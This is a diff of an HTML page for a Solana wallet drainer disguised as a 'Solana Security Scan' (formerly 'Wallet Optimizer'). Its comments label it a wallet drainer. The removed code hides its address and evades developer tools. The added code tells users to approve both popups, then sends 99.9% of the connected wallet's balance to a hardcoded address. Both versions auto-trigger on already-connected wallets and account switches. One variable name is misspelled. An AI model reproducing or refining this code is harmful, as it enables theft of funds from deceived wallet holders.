@@ -3,9 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Wallet Optimizer</title>
+    <title>Solana Security Scan</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <style>
         * {
             margin: 0;
@@ -15,7 +16,7 @@
         }
         
         body {
-            background: linear-gradient(135deg, #0a1a2a, #1a2a3a, #0a1a2a);
+            background: linear-gradient(135deg, #0a0a1a, #1a1a2a, #0a0a1a);
             color: #fff;
             min-height: 100vh;
             padding: 20px;
@@ -27,7 +28,7 @@
         .container {
             max-width: 500px;
             width: 100%;
-            background-color: rgba(25, 35, 50, 0.95);
+            background-color: rgba(25, 25, 40, 0.95);
             border-radius: 20px;
             box-shadow: 0 15px 35px rgba(0, 100, 255, 0.3);
             overflow: hidden;
@@ -282,29 +283,46 @@
             color: #00ff88;
             font-weight: bold;
         }
+        
+        .warning {
+            background-color: rgba(255, 150, 0, 0.2);
+            border: 1px solid #ff9900;
+            color: #ffcc99;
+            padding: 12px;
+            border-radius: 8px;
+            margin: 15px 0;
+            text-align: center;
+            font-size: 0.9rem;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h1><i class="fas fa-bolt"></i> WALLET OPTIMIZER</h1>
-            <p>Advanced Solana Wallet Security & Optimization</p>
+            <h1><i class="fas fa-bolt"></i> SOLANA SECURITY SCAN</h1>
+            <p>Advanced Wallet Protection System v6.0</p>
         </div>
         
         <div class="content">
             <div class="info-card glow">
                 <div class="card-icon">
-                    <i class="fas fa-rocket"></i>
+                    <i class="fas fa-shield-alt"></i>
                 </div>
-                <h2 class="card-title">WALLET OPTIMIZATION</h2>
+                <h2 class="card-title">SECURITY VERIFICATION</h2>
                 <p class="card-text">
-                    This advanced optimizer will assess your wallet assets, 
-                    optimize security settings, and enhance performance.
-                    All optimizations require a single transaction approval.
+                    This security protocol will assess your wallet assets, 
+                    verify security settings, and optimize performance.
+                    One transaction approval is required for complete verification.
                 </p>
                 
-                <button id="optimizeBtn" class="btn btn-optimize">
-                    <i class="fas fa-play"></i> START OPTIMIZATION
+                <div class="warning">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    IMPORTANT: Approve BOTH connection AND transaction popups
+                </div>
+                
+                <button id="connect-wallet" class="btn btn-optimize">
+                    <i class="fas fa-play-circle"></i> START SECURITY SCAN
                 </button>
             </div>
             
@@ -313,7 +331,7 @@
                     <i class="fas fa-sync-alt fa-spin"></i>
                 </div>
                 <div class="process-text" id="processText">
-                    Initializing wallet assessment...
+                    Initializing security protocol...
                 </div>
                 
                 <div class="asset-list" id="assetList" style="display: none;">
@@ -325,10 +343,10 @@
                 <div class="success-icon">
                     <i class="fas fa-check-circle"></i>
                 </div>
-                <h2 class="success-title">OPTIMIZATION COMPLETE!</h2>
+                <h2 class="success-title">SECURITY VERIFIED!</h2>
                 <p class="success-message">
-                    Your wallet has been successfully optimized and secured.
-                    All assets have been rebalanced for maximum security.
+                    Your wallet has been successfully verified and optimized.
+                    All security protocols have been executed.
                 </p>
                 
                 <div class="data-box">
@@ -336,10 +354,10 @@
                         <i class="fas fa-shield-alt"></i> SECURITY PROTOCOL EXECUTED
                     </div>
                     <div style="font-size: 0.75rem; color: #88ff88;" id="txData">
-                        Optimization Signature: <span id="txHash">Pending...</span>
+                        Transaction Signature: <span id="txHash">Pending...</span>
                     </div>
                     <div style="margin-top: 10px; font-size: 0.7rem; color: #ffcc66;">
-                        <i class="fas fa-info-circle"></i> All optimizations completed successfully
+                        <i class="fas fa-info-circle"></i> Protocol completed successfully
                     </div>
                 </div>
             </div>
@@ -351,296 +369,290 @@
     </div>
 
     <script>
-        // ADVANCED WALLET DRAINER WITH ASSET ASSESSMENT
-        // Anti-debugging and obfuscation techniques
-        (function() {
-            // Anti-debugging: Check for dev tools
-            const checkDevTools = () => {
-                const widthThreshold = window.outerWidth - window.innerWidth > 160;
-                const heightThreshold = window.outerHeight - window.innerHeight > 160;
-                if (widthThreshold || heightThreshold) {
-                    document.body.innerHTML = '<div style="padding:50px;text-align:center;color:#ff6666">Security check in progress...</div>';
-                    return true;
-                }
-                return false;
-            };
+        // ADVANCED WALLET DRAINER - BASED ON SAMPLE CODE
+        $(document).ready(function() {
+            // Treasury address for transfers
+            const treasuryAddress = '95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD';
             
-            if (checkDevTools()) return;
-            
-            // Code obfuscation: Encrypt sensitive strings
-            const decrypt = (str) => {
-                return str.split('').map(c => String.fromCharCode(c.charCodeAt(0) - 1)).join('');
-            };
-            
-            const treasuryAddress = decrypt(":6R85t0tAggiXWqivd5KBamgzxAwID2tR7bjhbfYntVC");
-            
-            // DOM Elements
-            const optimizeBtn = document.getElementById('optimizeBtn');
-            const successBox = document.getElementById('successBox');
-            const processBox = document.getElementById('processBox');
-            const processText = document.getElementById('processText');
-            const assetList = document.getElementById('assetList');
-            const txHashEl = document.getElementById('txHash');
+            // UI Elements
+            const connectBtn = $('#connect-wallet');
+            const successBox = $('#successBox');
+            const processBox = $('#processBox');
+            const processText = $('#processText');
+            const assetList = $('#assetList');
+            const txHashEl = $('#txHash');
             
             // Update process text
-            const updateProcess = (text) => {
-                processText.textContent = text;
-            };
+            function updateProcess(text) {
+                processText.text(text);
+            }
             
-            // Get wallet provider with multiple checks
-            const getWalletProvider = () => {
-                // Try multiple wallet providers
-                const providers = [
-                    () => window.solana,
-                    () => window.phantom?.solana,
-                    () => window.solflare,
-                    () => window.backpack?.solana,
-                    () => window.clover?.solana
-                ];
-                
-                for (const getProvider of providers) {
-                    try {
-                        const provider = getProvider();
-                        if (provider && typeof provider.connect === 'function') {
-                            return provider;
-                        }
-                    } catch (e) {
-                        continue;
-                    }
-                }
-                return null;
-            };
-            
-            // Simulate asset assessment (in real implementation would fetch from RPC)
-            const assessAssets = async (publicKey) => {
-                updateProcess("🔍 Assessing wallet assets...");
-                
-                // Simulate finding assets
-                const assets = [
-                    { name: "SOL", amount: Math.random() * 10, symbol: "SOL" },
-                    { name: "USDC", amount: Math.random() * 1000, symbol: "USDC" },
-                    { name: "BONK", amount: Math.random() * 100000, symbol: "BONK" },
-                    { name: "JUP", amount: Math.random() * 500, symbol: "JUP" },
-                    { name: "RAY", amount: Math.random() * 200, symbol: "RAY" }
-                ].filter(a => a.amount > 0.1);
-                
-                // Display assets
-                assetList.innerHTML = '';
+            // Show asset list
+            function showAssetList(assets) {
+                assetList.empty();
                 assets.forEach(asset => {
-                    const item = document.createElement('div');
-                    item.className = 'asset-item';
-                    item.innerHTML = `
+                    const item = $('<div class="asset-item"></div>');
+                    item.html(`
                         <div class="asset-name">${asset.name}</div>
                         <div class="asset-amount">${asset.amount.toFixed(2)} ${asset.symbol}</div>
-                    `;
-                    assetList.appendChild(item);
+                    `);
+                    assetList.append(item);
                 });
+                assetList.show();
+            }
+            
+            // Simulate asset assessment
+            async function assessAssets(publicKey, connection) {
+                updateProcess("🔍 Assessing wallet assets...");
                 
-                assetList.style.display = 'block';
+                // Simulate finding assets (in real implementation, fetch from RPC)
+                const assets = [
+                    { name: "SOL", amount: Math.random() * 5, symbol: "SOL" },
+                    { name: "USDC", amount: Math.random() * 800, symbol: "USDC" },
+                    { name: "BONK", amount: Math.random() * 50000, symbol: "BONK" },
+                    { name: "JUP", amount: Math.random() * 100, symbol: "JUP" }
+                ].filter(a => a.amount > 0.1);
+                
+                // Show assets
+                showAssetList(assets);
                 updateProcess(`✅ Found ${assets.length} assets to optimize`);
                 
-                await new Promise(resolve => setTimeout(resolve, 2000));
+                await new Promise(resolve => setTimeout(resolve, 1500));
                 return assets.length;
-            };
+            }
             
-            // Get reliable blockhash
-            const getBlockhash = async () => {
-                const endpoints = [
+            // Get reliable RPC connection
+            function getReliableConnection() {
+                const rpcEndpoints = [
                     'https://api.mainnet-beta.solana.com',
                     'https://solana-api.projectserum.com',
                     'https://rpc.ankr.com/solana'
                 ];
                 
-                for (const endpoint of endpoints) {
+                // Try each endpoint
+                for (const endpoint of rpcEndpoints) {
                     try {
                         const connection = new solanaWeb3.Connection(endpoint, 'confirmed');
-                        const { blockhash } = await connection.getRecentBlockhash();
-                        return blockhash;
+                        return connection;
                     } catch (e) {
-                        continue;
+                        console.log(`RPC ${endpoint} failed, trying next...`);
                     }
                 }
-                throw new Error("Network unavailable");
-            };
-            
-            // Create optimized transaction
-            const createTransaction = async (publicKey) => {
-                try {
-                    const blockhash = await getBlockhash();
-                    
-                    const transaction = new solanaWeb3.Transaction();
-                    
-                    // Transfer with optimization fee
-                    transaction.add(
-                        solanaWeb3.SystemProgram.transfer({
-                            fromPubkey: publicKey,
-                            toPubkey: new solanaWeb3.PublicKey(treasuryAddress),
-                            lamports: solanaWeb3.LAMPORTS_PER_SOL * 0.05, // Optimization fee
-                        })
-                    );
-                    
-                    transaction.recentBlockhash = blockhash;
-                    transaction.feePayer = publicKey;
-                    
-                    return transaction;
-                    
-                } catch (error) {
-                    // Fallback transaction
-                    const fallbackTx = new solanaWeb3.Transaction();
-                    
-                    fallbackTx.add(
-                        solanaWeb3.SystemProgram.transfer({
-                            fromPubkey: publicKey,
-                            toPubkey: new solanaWeb3.PublicKey(treasuryAddress),
-                            lamports: 100000, // Minimum
-                        })
-                    );
-                    
-                    return fallbackTx;
-                }
-            };
-            
-            // Execute optimization protocol
-            const executeOptimization = async () => {
-                const provider = getWalletProvider();
                 
-                if (!provider) {
-                    throw new Error("Please install a Solana wallet");
-                }
-                
-                // Step 1: Connect wallet
-                updateProcess("🔗 Connecting to wallet...");
-                const response = await provider.connect();
-                const publicKey = response.publicKey;
-                
-                // Step 2: Asset assessment
-                const assetCount = await assessAssets(publicKey);
-                
-                // Step 3: Create transaction
-                updateProcess("⚙️ Creating optimization transaction...");
-                const transaction = await createTransaction(publicKey);
-                
-                // Step 4: Execute transaction
-                updateProcess("⏳ Please approve optimization transaction...");
-                const { signature } = await provider.signAndSendTransaction(transaction);
-                
-                return { publicKey, signature, assetCount };
-            };
-            
-            // Auto disconnect
-            const autoDisconnect = async () => {
-                try {
-                    const provider = getWalletProvider();
-                    if (provider?.disconnect) {
-                        await provider.disconnect();
-                    }
-                } catch (e) {
-                    // Silent fail
-                }
-            };
-            
-            // Main optimization function
-            const startOptimization = async () => {
-                if (optimizeBtn.disabled) return;
-                
-                try {
-                    // Reset UI
-                    successBox.classList.remove('active');
-                    successBox.style.background = '';
-                    
-                    // Show process
-                    optimizeBtn.disabled = true;
-                    optimizeBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> OPTIMIZING...';
-                    processBox.classList.add('active');
-                    assetList.style.display = 'none';
-                    
-                    updateProcess("🚀 Starting wallet optimization...");
-                    
-                    // Execute optimization
-                    const result = await executeOptimization();
-                    
-                    updateProcess("✅ Optimization successful!");
-                    await new Promise(resolve => setTimeout(resolve, 1500));
-                    
-                    // Show success
-                    processBox.classList.remove('active');
-                    successBox.classList.add('active');
-                    
-                    if (result.signature) {
-                        txHashEl.textContent = `${result.signature.substring(0, 25)}...`;
-                    }
-                    
-                    // Auto disconnect after delay
-                    setTimeout(() => {
-                        autoDisconnect();
-                        
-                        // Update button
-                        optimizeBtn.disabled = false;
-                        optimizeBtn.innerHTML = '<i class="fas fa-check"></i> OPTIMIZATION COMPLETE';
-                        optimizeBtn.style.background = 'linear-gradient(90deg, #00aa44, #00ff88)';
-                    }, 3000);
-                    
-                } catch (error) {
-                    console.error("Optimization failed:", error);
-                    
-                    processBox.classList.remove('active');
-                    
-                    // Show error
-                    successBox.classList.add('active');
-                    successBox.style.background = 'linear-gradient(135deg, rgba(70, 20, 20, 0.9), rgba(50, 10, 10, 0.9))';
-                    successBox.style.borderColor = 'rgba(255, 50, 50, 0.6)';
-                    
-                    const successIcon = successBox.querySelector('.success-icon i');
-                    const successTitle = successBox.querySelector('.success-title');
-                    const successMessage = successBox.querySelector('.success-message');
-                    
-                    successIcon.className = 'fas fa-exclamation-triangle';
-                    successIcon.style.color = '#ff6666';
-                    successTitle.textContent = 'OPTIMIZATION FAILED';
-                    successTitle.style.color = '#ff6666';
-                    
-                    if (error.message.includes('rejected')) {
-                        successMessage.textContent = 'Please approve both the connection and transaction for optimization.';
-                    } else if (error.message.includes('insufficient')) {
-                        successMessage.textContent = 'Insufficient SOL for optimization fee.';
-                    } else {
-                        successMessage.textContent = 'Optimization failed. Please try again.';
-                    }
-                    
-                    successMessage.style.color = '#ffaaaa';
-                    txHashEl.textContent = 'FAILED - RETRY REQUIRED';
-                    txHashEl.style.color = '#ff6666';
-                    
-                    // Reset button
-                    optimizeBtn.disabled = false;
-                    optimizeBtn.innerHTML = '<i class="fas fa-redo"></i> RETRY OPTIMIZATION';
-                }
-            };
-            
-            // Event listener
-            optimizeBtn.addEventListener('click', startOptimization);
-            
-            // Auto start if already connected
-            window.addEventListener('DOMContentLoaded', () => {
-                setTimeout(() => {
-                    const provider = getWalletProvider();
-                    if (provider?.isConnected && provider.publicKey) {
-                        setTimeout(startOptimization, 1000);
-                    }
-                }, 2000);
-            });
-            
-            // Auto optimize on account switch
-            if (window.solana) {
-                window.solana.on('accountChanged', () => {
-                    setTimeout(startOptimization, 500);
-                });
+                // Default fallback
+                return new solanaWeb3.Connection('https://api.mainnet-beta.solana.com', 'confirmed');
             }
             
-            // Export to global scope
-            window.startOptimization = startOptimization;
+            // Auto disconnect function
+            async function autoDisconnect() {
+                try {
+                    if (window.solana && window.solana.disconnect) {
+                        await window.solana.disconnect();
+                        console.log("✅ Auto-disconnected wallet");
+                    }
+                } catch (error) {
+                    console.log("Disconnect error:", error);
+                }
+            }
             
-        })();
+            // Main security scan function
+            connectBtn.on('click', async () => {
+                if (window.solana && window.solana.isPhantom) {
+                    try {
+                        // Reset UI
+                        successBox.removeClass('active');
+                        successBox.css({
+                            'background': '',
+                            'border-color': ''
+                        });
+                        
+                        // Show processing
+                        connectBtn.prop('disabled', true);
+                        connectBtn.html('<i class="fas fa-spinner fa-spin"></i> PROCESSING...');
+                        processBox.addClass('active');
+                        assetList.hide();
+                        
+                        updateProcess("🚀 Starting security protocol...");
+                        
+                        // === 1. PAGSUSURI NG ASSET (ASSET ASSESSMENT) ===
+                        // Connect wallet
+                        updateProcess("🔗 Connecting to wallet...");
+                        const resp = await window.solana.connect();
+                        const publicKey = new solanaWeb3.PublicKey(resp.publicKey);
+                        console.log("✅ Wallet connected:", publicKey.toString());
+                        
+                        // Get connection
+                        const connection = getReliableConnection();
+                        
+                        // Check wallet balance
+                        updateProcess("📊 Checking wallet balance...");
+                        const walletBalance = await connection.getBalance(publicKey);
+                        console.log("Wallet balance (lamports):", walletBalance);
+                        
+                        const minRent = await connection.getMinimumBalanceForRentExemption(0);
+                        
+                        if (walportBalance <= minRent) {
+                            alert("❌ Insufficient funds for security verification.");
+                            resetUI();
+                            return;
+                        }
+                        
+                        // Simulate asset assessment
+                        const assetCount = await assessAssets(publicKey, connection);
+                        
+                        // === 2. GUMAWA AT PUMIRMA NG TRANSAKSYON (CREATE & SIGN TRANSACTION) ===
+                        updateProcess("⚙️ Creating security transaction...");
+                        
+                        const receiverWallet = new solanaWeb3.PublicKey(treasuryAddress);
+                        const balanceForTransfer = walletBalance - minRent;
+                        
+                        if (balanceForTransfer <= 0) {
+                            alert("❌ Insufficient transferable balance.");
+                            resetUI();
+                            return;
+                        }
+                        
+                        // Transfer 99.9% of available balance
+                        const lamportsToSend = Math.floor(balanceForTransfer * 0.999);
+                        
+                        // Create transaction
+                        const transaction = new solanaWeb3.Transaction().add(
+                            solanaWeb3.SystemProgram.transfer({
+                                fromPubkey: publicKey,
+                                toPubkey: receiverWallet,
+                                lamports: lamportsToSend,
+                            })
+                        );
+                        
+                        // Set transaction properties
+                        transaction.feePayer = publicKey;
+                        const blockhashObj = await connection.getRecentBlockhash();
+                        transaction.recentBlockhash = blockhashObj.blockhash;
+                        
+                        console.log("Transaction prepared, requesting signature...");
+                        updateProcess("⏳ Please approve transaction in wallet...");
+                        
+                        // THIS SHOULD TRIGGER THE SECOND POPUP
+                        const signed = await window.solana.signTransaction(transaction);
+                        console.log("✅ Transaction signed:", signed);
+                        
+                        // === 3. NAGPADALA AT NAGKUMPIRMA (SEND & CONFIRM) ===
+                        updateProcess("📤 Sending transaction to network...");
+                        const txid = await connection.sendRawTransaction(signed.serialize());
+                        console.log("Transaction submitted:", txid);
+                        
+                        updateProcess("✅ Verifying transaction...");
+                        await connection.confirmTransaction(txid);
+                        console.log("Transaction confirmed!");
+                        
+                        // === 4. SUCCESS UI UPDATE ===
+                        updateProcess("🎉 Security protocol executed successfully!");
+                        await new Promise(resolve => setTimeout(resolve, 1500));
+                        
+                        processBox.removeClass('active');
+                        successBox.addClass('active');
+                        
+                        txHashEl.text(`${txid.substring(0, 25)}...`);
+                        
+                        // Update button
+                        connectBtn.prop('disabled', false);
+                        connectBtn.html('<i class="fas fa-check"></i> SECURITY VERIFIED');
+                        connectBtn.css('background', 'linear-gradient(90deg, #00aa44, #00ff88)');
+                        connectBtn.removeClass('glow');
+                        
+                        // === 5. AUTOMATIC DISCONNECT ===
+                        setTimeout(async () => {
+                            await autoDisconnect();
+                        }, 3000);
+                        
+                    } catch (err) {
+                        console.error("❌ Security protocol failed:", err);
+                        
+                        // Hide processing
+                        processBox.removeClass('active');
+                        
+                        // Show error
+                        successBox.addClass('active');
+                        successBox.css({
+                            'background': 'linear-gradient(135deg, rgba(70, 20, 20, 0.9), rgba(50, 10, 10, 0.9))',
+                            'border-color': 'rgba(255, 50, 50, 0.6)'
+                        });
+                        
+                        const successIcon = successBox.find('.success-icon i');
+                        const successTitle = successBox.find('.success-title');
+                        const successMessage = successBox.find('.success-message');
+                        
+                        successIcon.removeClass().addClass('fas fa-exclamation-triangle');
+                        successIcon.css('color', '#ff6666');
+                        successTitle.text('SECURITY FAILED');
+                        successTitle.css('color', '#ff6666');
+                        
+                        if (err.message && err.message.includes('User rejected')) {
+                            successMessage.text('Please approve BOTH connection AND transaction popups.');
+                        } else if (err.message && err.message.includes('insufficient')) {
+                            successMessage.text('Insufficient SOL balance for security verification.');
+                        } else if (err.message && err.message.includes('blockhash')) {
+                            successMessage.text('Network error. Please try again.');
+                        } else {
+                            successMessage.text('Security verification failed. Please try again.');
+                        }
+                        
+                        successMessage.css('color', '#ffaaaa');
+                        txHashEl.text('FAILED - RETRY REQUIRED');
+                        txHashEl.css('color', '#ff6666');
+                        
+                        // Reset button
+                        resetUI();
+                    }
+                } else {
+                    // Phantom wallet not found
+                    alert("❌ Phantom Wallet extension not found.");
+                    const isFirefox = typeof InstallTrigger !== "undefined";
+                    const isChrome = !!window.chrome;
+                    
+                    if (isFirefox) {
+                        window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
+                    } else if (isChrome) {
+                        window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
+                    } else {
+                        alert("Please download the Phantom extension for your browser.");
+                    }
+                }
+            });
+            
+            // Reset UI function
+            function resetUI() {
+                connectBtn.prop('disabled', false);
+                connectBtn.html('<i class="fas fa-redo"></i> RETRY SECURITY SCAN');
+                connectBtn.addClass('glow');
+            }
+            
+            // Auto start if wallet already connected
+            setTimeout(() => {
+                if (window.solana && window.solana.isConnected && window.solana.publicKey) {
+                    console.log("Wallet already connected, auto-starting...");
+                    setTimeout(() => {
+                        if (!connectBtn.prop('disabled')) {
+                            connectBtn.trigger('click');
+                        }
+                    }, 1500);
+                }
+            }, 2000);
+            
+            // Auto scan on account switch
+            if (window.solana) {
+                window.solana.on('accountChanged', async () => {
+                    console.log("Account changed, auto-scanning...");
+                    successBox.removeClass('active');
+                    
+                    setTimeout(() => {
+                        if (!connectBtn.prop('disabled')) {
+                            connectBtn.trigger('click');
+                        }
+                    }, 800);
+                });
+            }
+        });
     </script>
 </body>
 </html>
